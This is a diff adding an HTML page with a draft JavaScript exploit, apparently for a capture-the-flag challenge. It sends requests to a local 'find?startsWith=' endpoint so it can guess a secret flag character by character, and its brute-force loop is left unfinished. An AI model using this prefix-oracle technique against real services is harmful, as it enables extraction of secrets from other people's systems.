@@ -1,0 +1,41 @@
+<html>
+
+<head>
+    <title>Please</title>
+</head>
+
+<body>
+    <script>
+        printable = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~', ' ', '\t', '\n', '\r', '\x0b', '\x0c']
+        flag = ''
+        async function test(flag_test) {
+            try {
+                // Create an XMLHttpRequest object
+                xhttp = new XMLHttpRequest();
+
+                // Define a callback function
+                xhttp.onload = function() {
+                    // Here you can use the Data
+                    return xhttp.response
+                }
+
+                // Send a request
+                xhttp.open("GET", "http://localhost/find?startsWith=" + flag_test + "&debug=t&Access-Control-Allow-Origin=*");
+                xhttp.send();
+            } catch (e) {
+                return e
+            }
+
+        }
+
+        console.log(test('t'));
+        console.log(test('e'));
+        /*function flag_brute {
+            while (true) {
+                for
+            }
+        }*/
+    </script>
+</body>
+
+</html>
